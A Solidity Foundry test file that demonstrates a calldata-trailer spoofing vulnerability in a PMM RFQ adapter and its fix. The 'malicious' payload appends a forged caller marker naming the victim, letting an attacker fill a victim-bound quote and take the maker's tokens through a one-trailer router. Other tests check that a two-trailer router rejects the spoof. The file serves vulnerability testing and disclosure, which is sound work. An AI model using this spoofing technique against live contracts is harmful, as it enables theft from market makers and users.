// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {PMMProtocol} from "../src/PmmProtocol.sol";
import {PMMAdapter, CallerAuthData} from "../src/PmmAdaptor.sol";
import {OrderRFQLib} from "../src/OrderRFQLib.sol";
import {IWETH} from "../src/interfaces/IWETH.sol";
import {Errors} from "../src/libraries/Errors.sol";
import {DEX_ROUTER_CALLER_MARKER, ORIGIN_PAYER} from "../src/libraries/Constants.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockWETH} from "./mocks/MockWETH.sol";

contract OneTrailerRouter {
    function execute(
        PMMAdapter adapter,
        address target,
        address pool,
        bytes memory moreInfo,
        address refundTo,
        MockERC20 takerToken,
        uint256 takerAmount
    ) external {
        require(takerToken.transferFrom(msg.sender, address(adapter), takerAmount), "TAKER_TRANSFER");
        (bool ok, bytes memory ret) = address(adapter).call(
            abi.encodePacked(
                abi.encodeWithSelector(PMMAdapter.sellBase.selector, target, pool, moreInfo),
                ORIGIN_PAYER | uint256(uint160(refundTo))
            )
        );
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }
}

contract TwoTrailerRouter {
    function execute(
        PMMAdapter adapter,
        address target,
        address pool,
        bytes memory moreInfo,
        address refundTo,
        MockERC20 takerToken,
        uint256 takerAmount
    ) external {
        require(takerToken.transferFrom(msg.sender, address(adapter), takerAmount), "TAKER_TRANSFER");
        (bool ok, bytes memory ret) = address(adapter).call(
            abi.encodePacked(
                abi.encodeWithSelector(PMMAdapter.sellBase.selector, target, pool, moreInfo),
                DEX_ROUTER_CALLER_MARKER | uint256(uint160(msg.sender)),
                ORIGIN_PAYER | uint256(uint160(refundTo))
            )
        );
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }
}

contract PmmCallerTrailerActualTest is Test {
    PMMProtocol internal protocol;
    PMMAdapter internal adapter;
    MockERC20 internal makerToken;
    MockERC20 internal takerToken;
    MockWETH internal weth;
    OneTrailerRouter internal vulnerableRouter;
    TwoTrailerRouter internal fixedRouter;

    uint256 internal authSignerKey;
    address internal authSigner;
    uint256 internal makerKey;
    address internal maker;
    address internal attacker;
    address internal victim;

    uint256 internal constant RFQ_ID = 2026082201;
    uint256 internal constant MAKER_AMOUNT = 100 ether;
    uint256 internal constant TAKER_AMOUNT = 200 ether;
    uint256 internal nonceSeq;

    function setUp() public {
        (authSigner, authSignerKey) = makeAddrAndKey("authSigner");
        (maker, makerKey) = makeAddrAndKey("maker");
        attacker = makeAddr("attacker");
        victim = makeAddr("victimAllowedSender");

        weth = new MockWETH();
        makerToken = new MockERC20("MakerToken", "MAKER", 18);
        takerToken = new MockERC20("TakerToken", "TAKER", 18);
        protocol = new PMMProtocol(IWETH(address(weth)), authSigner);
        adapter = new PMMAdapter(authSigner);
        vulnerableRouter = new OneTrailerRouter();
        fixedRouter = new TwoTrailerRouter();

        makerToken.mint(maker, 1_000 ether);
        vm.prank(maker);
        makerToken.approve(address(protocol), type(uint256).max);

        takerToken.mint(attacker, 1_000 ether);
        takerToken.mint(victim, 1_000 ether);
        vm.prank(attacker);
        takerToken.approve(address(vulnerableRouter), type(uint256).max);
        vm.prank(attacker);
        takerToken.approve(address(fixedRouter), type(uint256).max);
        vm.prank(victim);
        takerToken.approve(address(fixedRouter), type(uint256).max);

        vm.warp(1_000_000);
    }

    function _signAuth(
        address verifyingContract,
        bytes32 payloadHash,
        address[] memory allowedCallers,
        uint256 nonce,
        uint256 key
    ) internal view returns (bytes memory) {
        bytes32 inner = keccak256(abi.encode(verifyingContract, payloadHash, allowedCallers, nonce, block.chainid));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", inner));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        bytes32 vs = s | bytes32(uint256(v - 27) << 255);
        return abi.encodePacked(r, vs);
    }

    function _auth(address verifyingContract, bytes32 payloadHash, address[] memory allowedCallers)
        internal
        returns (CallerAuthData memory data)
    {
        uint256 nonce = ++nonceSeq;
        data = CallerAuthData({
            allowedCallers: allowedCallers,
            nonce: nonce,
            authSig: _signAuth(verifyingContract, payloadHash, allowedCallers, nonce, authSignerKey)
        });
    }

    function _single(address value) internal pure returns (address[] memory values) {
        values = new address[](1);
        values[0] = value;
    }

    function _order() internal view returns (OrderRFQLib.OrderRFQ memory order) {
        order = OrderRFQLib.OrderRFQ({
            rfqId: RFQ_ID,
            expiry: block.timestamp + 1 hours,
            makerAsset: address(makerToken),
            takerAsset: address(takerToken),
            makerAddress: maker,
            makerAmount: MAKER_AMOUNT,
            takerAmount: TAKER_AMOUNT,
            usePermit2: false,
            allowedSender: victim,
            confidenceT: 0,
            confidenceWeight: 0,
            confidenceCap: 0,
            permit2Signature: "",
            permit2Witness: bytes32(0),
            permit2WitnessType: ""
        });
    }

    function _signOrder(OrderRFQLib.OrderRFQ memory order) internal view returns (bytes memory signature) {
        bytes32 orderHash = OrderRFQLib.hash(order, protocol.DOMAIN_SEPARATOR());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerKey, orderHash);
        signature = abi.encodePacked(r, s, v);
    }

    function _moreInfo(address router)
        internal
        returns (
            bytes memory canonical,
            bytes memory malicious,
            uint256 adaptorNonce,
            uint256 protocolNonce
        )
    {
        OrderRFQLib.OrderRFQ memory order = _order();
        bytes memory orderSignature = _signOrder(order);
        CallerAuthData memory protocolAuth =
            _auth(address(protocol), keccak256(abi.encode(order)), _single(address(adapter)));
        CallerAuthData memory adaptorAuth =
            _auth(address(adapter), keccak256(abi.encode(order)), _single(router));
        adaptorNonce = adaptorAuth.nonce;
        protocolNonce = protocolAuth.nonce;
        bytes memory orderInfo = abi.encode(order, adaptorAuth, protocolAuth);
        canonical = abi.encode(orderInfo, orderSignature, uint256(0), uint256(4));
        malicious = abi.encodePacked(
            canonical,
            DEX_ROUTER_CALLER_MARKER | uint256(uint160(victim))
        );
    }

    function test_ActualV4_AttackerExecutesVictimBoundQuoteAndReceivesMakerAsset() public {
        (bytes memory canonical, bytes memory malicious, uint256 adaptorNonce, uint256 protocolNonce) =
            _moreInfo(address(vulnerableRouter));
        canonical;

        uint256 makerMakerBefore = makerToken.balanceOf(maker);
        uint256 attackerMakerBefore = makerToken.balanceOf(attacker);
        uint256 attackerTakerBefore = takerToken.balanceOf(attacker);
        uint256 makerTakerBefore = takerToken.balanceOf(maker);

        vm.prank(attacker);
        vulnerableRouter.execute(
            adapter,
            attacker,
            address(protocol),
            malicious,
            attacker,
            takerToken,
            TAKER_AMOUNT
        );

        assertEq(makerToken.balanceOf(maker), makerMakerBefore - MAKER_AMOUNT, "maker asset debit");
        assertEq(makerToken.balanceOf(attacker), attackerMakerBefore + MAKER_AMOUNT, "attacker output");
        assertEq(takerToken.balanceOf(attacker), attackerTakerBefore - TAKER_AMOUNT, "attacker input");
        assertEq(takerToken.balanceOf(maker), makerTakerBefore + TAKER_AMOUNT, "maker consideration");
        assertTrue(protocol.isRfqIdUsed(maker, uint64(RFQ_ID)), "RFQ consumed");
        assertTrue(adapter.isNonceUsed(adaptorNonce), "adapter nonce consumed");
        assertTrue(protocol.isNonceUsed(protocolNonce), "protocol nonce consumed");
    }

    function test_ActualV4_NoSuffixRejectsAttackerAndRollsBack() public {
        (bytes memory canonical,,,) = _moreInfo(address(vulnerableRouter));
        uint256 makerBefore = makerToken.balanceOf(maker);
        uint256 attackerBefore = takerToken.balanceOf(attacker);

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(Errors.RFQ_BadSender.selector, RFQ_ID));
        vulnerableRouter.execute(
            adapter,
            attacker,
            address(protocol),
            canonical,
            attacker,
            takerToken,
            TAKER_AMOUNT
        );

        assertEq(makerToken.balanceOf(maker), makerBefore, "maker rollback");
        assertEq(makerToken.balanceOf(attacker), 0, "no attacker output");
        assertEq(takerToken.balanceOf(attacker), attackerBefore, "attacker input rollback");
        assertFalse(protocol.isRfqIdUsed(maker, uint64(RFQ_ID)), "RFQ remains usable");
    }

    function test_ActualV4_TwoTrailerFixRejectsSpoofAndRollsBack() public {
        (, bytes memory malicious,,) = _moreInfo(address(fixedRouter));
        uint256 makerBefore = makerToken.balanceOf(maker);
        uint256 attackerBefore = takerToken.balanceOf(attacker);

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(Errors.RFQ_BadSender.selector, RFQ_ID));
        fixedRouter.execute(
            adapter,
            attacker,
            address(protocol),
            malicious,
            attacker,
            takerToken,
            TAKER_AMOUNT
        );

        assertEq(makerToken.balanceOf(maker), makerBefore, "maker rollback");
        assertEq(makerToken.balanceOf(attacker), 0, "no attacker output");
        assertEq(takerToken.balanceOf(attacker), attackerBefore, "attacker input rollback");
        assertFalse(protocol.isRfqIdUsed(maker, uint64(RFQ_ID)), "RFQ remains usable");
    }

    function test_ActualV4_TwoTrailerFixAllowsTheRealVictim() public {
        (bytes memory canonical,,,) = _moreInfo(address(fixedRouter));
        uint256 victimMakerBefore = makerToken.balanceOf(victim);
        uint256 victimTakerBefore = takerToken.balanceOf(victim);

        vm.prank(victim);
        fixedRouter.execute(
            adapter,
            victim,
            address(protocol),
            canonical,
            victim,
            takerToken,
            TAKER_AMOUNT
        );

        assertEq(makerToken.balanceOf(victim), victimMakerBefore + MAKER_AMOUNT, "victim output");
        assertEq(takerToken.balanceOf(victim), victimTakerBefore - TAKER_AMOUNT, "victim input");
        assertTrue(protocol.isRfqIdUsed(maker, uint64(RFQ_ID)), "RFQ consumed");
    }
}
